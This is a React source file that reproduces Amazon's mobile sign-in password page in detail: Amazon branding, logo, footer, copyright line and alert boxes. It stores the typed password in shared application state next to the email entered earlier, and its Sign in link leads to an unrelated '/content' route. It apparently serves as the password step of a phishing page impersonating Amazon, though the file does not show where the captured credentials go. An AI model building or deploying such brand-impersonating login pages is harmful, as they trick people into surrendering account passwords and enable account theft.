import React, { useState } from 'react'
import { useEmail } from '../Context/ContextApi';

export default function PassMobile() {

    const { email, password, setPassword } = useEmail()
    const [showErrorMessage, setShowErrorMessage] = useState(false)
    const [emptyPass, setEmptyPass] = useState(false);

    const handleInputChange = (event) => {
        setPassword(event.target.value);

    }

    const handleContinueClick = (event) => {
        if (password.includes(' ')) {
            event.preventDefault();
            setShowErrorMessage(true)
            setEmptyPass(false)
        }else if(password.trim() === ''){
          event.preventDefault();
          setEmptyPass(true);
          setShowErrorMessage(false);
      }else {
            setShowErrorMessage(false);
            setEmptyPass(false);
        }
    }

  return (
    <div id="a-page">
      <div className="a-section a-spacing-none">
        <img
          src="https://m.media-amazon.com/images/G/01/gno/sprites/new-nav-sprite-global-1x_blueheaven-privacy._CB588007131_.png"
          className="display-none"
          alt=""
        />

        <header
          id="nav-main"
          data-nav-language="en_US"
          className="nav-mobile nav-progressive-attribute nav-locale-us nav-lang-en nav-ssl nav-unrec nav-blueheaven"
        >
          <div
            id="navbar"
            cel_widget_id="Navigation-mobile-navbar"
            role="navigation"
            aria-label="navigation"
            className="nav-t-basicNoAuth nav-sprite-v3 celwidget"
            data-csa-c-id="2js4g6-e7evbv-tkd480-dryymo"
          >
            <div id="nav-logobar">
              <div className="nav-left">
                <div id="nav-logo">
                  <a
                    href="/ref=navm_hdr_logo"
                    id="nav-logo-sprites"
                    className="nav-logo-link nav-progressive-attribute"
                    aria-label="Amazon"
                  >
                    <span className="nav-sprite nav-logo-base"></span>
                    <span
                      id="logo-ext"
                      className="nav-sprite nav-logo-ext nav-progressive-content"
                    ></span>
                    <span className="nav-logo-locale">.us</span>
                  </a>
                </div>
              </div>
              <div className="nav-right"></div>
            </div>
          </div>

          <div id="nav-progressive-subnav"></div>
        </header>

        <a id="skippedLink" tabIndex="-1"></a>
      </div>

      <div className="a-container">
        <div className="a-section a-spacing-none"></div>

        <div className="a-section a-spacing-none auth-pagelet-mobile-container">
          {
            showErrorMessage && (
              <div
            id="auth-error-message-box"
            className="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base"
            role="alert"
          >
            <div className="a-box-inner a-alert-container">
              <h4 className="a-alert-heading">There was a problem</h4>
              <div className="a-alert-content">
                <ul className="a-unordered-list a-nostyle a-vertical" role="alert">
                  <li>
                    <span className="a-list-item">
                      Your password is incorrect
                    </span>
                  </li>
                </ul>
              </div>
            </div>
          </div>
            )
          }
        </div>

        <div className="a-section a-spacing-none auth-pagelet-mobile-container">
          {
            emptyPass && (
              <div
            id="auth-error-message-box"
            className="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base"
            role="alert"
          >
            <div className="a-box-inner a-alert-container">
              <h4 className="a-alert-heading">There was a problem</h4>
              <div className="a-alert-content">
                <ul className="a-unordered-list a-nostyle a-vertical" role="alert">
                  <li>
                    <span className="a-list-item">
                      Enter your password
                    </span>
                  </li>
                </ul>
              </div>
            </div>
          </div>
            )
          }
        </div>

        <div className="a-section auth-pagelet-mobile-container">
          
            <div
            id="auth-alert-window"
            className="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base"
            role="alert"
          >
            <div className="a-box-inner a-alert-container">
              <h4 className="a-alert-heading">There was a problem</h4>
              <div className="a-alert-content">
                <ul
                  className="a-unordered-list a-vertical auth-error-messages"
                  role="alert"
                >
                  
                  <li id="auth-password-missing-alert">
                    <span className="a-list-item"> Enter your password </span>
                  </li>
                  
                </ul>
              </div>
            </div>
          </div>
          

          <div
            id="passkey-error-alert"
            className="a-box a-alert a-alert-error aok-hidden"
            role="alert"
          >
            <div className="a-box-inner a-alert-container">
              <h4 className="a-alert-heading">Passkey error</h4>
              <div className="a-alert-content">
                <p id="passkey-client-error-message">
                  Something went wrong, please sign-in another way or follow any
                  instructions provided by your device.
                </p>
                <p id="passkey-generic-server-error-message" className="aok-hidden">
                  Sorry, your passkey isn't working. There might be a problem
                  with the server. Sign in with your password or try your
                  passkey again later.
                </p>
                <p id="passkey-server-error-message" className="aok-hidden"></p>
              </div>
            </div>
          </div>

          <h2>Sign in</h2>

          <div className="a-row a-spacing-base">
            <span dir="ltr">{email}</span>
            <a
              id="ap_change_login_claim"
              className="a-link-normal"
              tabIndex="7"
              href="/"
            >
              {' '}Change
            </a>
          </div>

          <form
            name="signIn"
            method="post"
            noValidate=""
            action=""
            className="auth-validate-form auth-clearable-form auth-validate-form"
            data-fwcim-id="0mKDpFRF"
          >
            <div
              className="a-input-text-group a-spacing-medium a-spacing-top-micro"
            >
              <label
                htmlFor="ap_password"
                aria-hidden="true"
                className=""
              >
                Amazon password
              </label>

              <div
                id="auth-password-container"
                className="a-input-text-wrapper auth-required-field auth-password-container auth-password auth-fill-password input_table_layout"
              >
                <input
                  type="password"
                  maxLength="1024"
                  id="ap_password"
                  value={password}
                  onChange={handleInputChange}
                  autoComplete="current-password"
                  name="password"
                  tabIndex="2"
                  spellCheck="false"
                  aria-label="Amazon password"
                />
                <div
                  className="a-row auth-visible-password-container auth-show-password-empty"
                >
                  <span
                    className="a-size-small a-color-secondary auth-visible-password"
                  ></span>
                </div>
              </div>

              <div
                id="ap_password_icon"
                className="auth-clear-icons display-none"
                tabIndex="2"
              >
                <i
                  className="a-icon a-icon-close"
                  role="img"
                  aria-label="Clear password text field, button"
                ></i>
              </div>

              
                  <div
                    id="auth-password-missing-alert"
                    className="a-box a-alert-inline a-alert-inline-error display-none a-spacing-top-mini"
                    role="alert"
                  >
                    <div className="a-box-inner a-alert-container">
                      <i className="a-icon a-icon-alert"></i>
                      <div className="a-alert-content">Enter your password</div>
                    </div>
                  </div>

              <input
                type="hidden"
                name="showPasswordChecked"
                value="true"
                id="ap_show_password_checked"
              />

              <input type="hidden" name="encryptedPasswordExpected" />
            </div>

            <div className="a-row">
              <div className="a-column a-span6 a-spacing-medium">
                <div
                  id="auth-show-password-checkbox-container"
                  className="a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox auth-show-password-checkbox"
                >
                  <label htmlFor="auth-signin-show-password-checkbox"
                    ><input
                      id="auth-signin-show-password-checkbox"
                      type="checkbox"
                      name=""
                      value=""
                      checked=""
                      tabIndex="3"
                    /><i className="a-icon a-icon-checkbox"></i
                    ><span className="a-label a-checkbox-label">
                      Show password
                    </span></label
                  >
                </div>
              </div>

              <div
                className="a-column a-span6 a-text-right a-spacing-none a-spacing-top-small a-span-last"
              >
                <a
                  id="auth-fpp-link-bottom"
                  className="a-spacing-none a-link-normal"
                  tabIndex="8"
                  href="/"
                >
                  Forgot password?
                </a>
              </div>
            </div>

            <div className="a-row a-spacing-base">
              <div
                data-a-input-name="rememberMe"
                className="a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox"
              >
                <label
                  ><input
                    type="checkbox"
                    name="rememberMe"
                    value="true"
                    tabIndex="4" /><i className="a-icon a-icon-checkbox"></i
                  ><span className="a-label a-checkbox-label">
                    Keep me signed in.
                    <span
                      className="a-declarative"
                      data-action="a-modal"
                      data-csa-c-type="widget"
                      data-csa-c-func-deps="aui-da-a-modal"
                      data-a-modal='{"max-width":"500px","closeButtonLabel":"","width":"95%","name":"remember-me-detail-link-modal","header":"\"Keep Me Signed In\" Checkbox"}'
                      data-csa-c-id="w3f900-sz1idw-iuta5s-19zlge"
                    >
                      <a
                        id="remember_me_learn_more_link"
                        className="a-link-normal"
                        href="/"
                      >
                        {' '}Details
                      </a>
                    </span>

                    <div
                      className="a-popover-preload"
                      id="a-popover-remember-me-detail-link-modal"
                    >
                      <div className="a-section a-spacing-large a-spacing-top-mini">
                        <p></p>
                        <p>
                          Choosing "Keep me signed in" reduces the number of
                          times you're asked to Sign-In on this device.
                        </p>
                        <p>
                          To keep your account secure, use this option only on
                          your personal devices.
                        </p>
                        <p></p>
                      </div>
                    </div> </span
                ></label>
              </div>
            </div>

            <div className="a-row"></div>

            <a href='/content'
              id=""
              onClick={
                handleContinueClick
              }
              className="a-button a-button-span12 a-button-primary auth-disable-button-on-submit"
              ><span className="a-button-inner"
                ><span
                  id="auth-signin-button-announce"
                  className="a-button-text"
                  aria-hidden="true"
                >
                  Sign in
                </span></span
              ></a
            >
          </form>
        </div>

        <footer className="nav-mobile nav-ftr-batmobile">
          <div id="nav-ftr" className="nav-t-footer-basicNoAuth nav-sprite-v3">
            <div className="icp-container-mobile">
              <a
                href="/customer-preferences/edit?from=mobile&amp;ie=UTF8&amp;preferencesReturnUrl=%2Fap%2Fsignin&amp;ref_=footer_lang"
                aria-label="Choose a language for shopping."
                className="icp-touch-link-2"
                id="icp-touch-link-language"
              >
                <div className="icp-nav-globe-img-2 icp-mobile-globe-2"></div>
                <span className="icp-color-base">English</span
                ><span className="nav-arrow icp-up-down-arrow"></span>
              </a>

              <a
                href="/customer-preferences/country?ie=UTF8&amp;preferencesReturnUrl=%2Fap%2Fsignin&amp;ref_=navm_footer_icp_cp"
                aria-label="Choose a country/region for shopping."
                className="icp-touch-link-2"
                id="icp-touch-link-country"
              >
                <span className="icp-flag-3 icp-flag-3-us"></span
                ><span className="icp-color-base">United States</span>
              </a>
            </div>

            <ul className="nav-ftr-horiz">
              <li className="nav-li">
                <a
                  href="/gp/help/customer/display.html?nodeId=508088&amp;ref_=navm_ftr_cou"
                  id=""
                  className="nav-a"
                  >Conditions of Use</a
                >
              </li>
              <li className="nav-li">
                <a
                  href="/gp/help/customer/display.html?ie=UTF8&amp;nodeId=468496&amp;ref_=footer_privacy"
                  id=""
                  className="nav-a"
                  >Privacy Notice</a
                >
              </li>
              <li className="nav-li">
                <a href="/privacyprefs?ref_=footer_iba" id="" className="nav-a"
                  >Your Ads Privacy Choices</a
                >
              </li>
              <li className="nav-li">
                <span id="nav-icon-ccba" className="nav-sprite"></span>
              </li>
            </ul>

            <div id="nav-ftr-copyright">
              © 1996-2024, Amazon.com, Inc. or its affiliates
            </div>
            <div id="nav-ftr-legal"></div>
          </div>
        </footer>
        <div
          id="sis_pixel_r2"
          aria-hidden="true"
          className='style-sign1'
        >
          
        </div>
      </div>
    </div>
  )
}
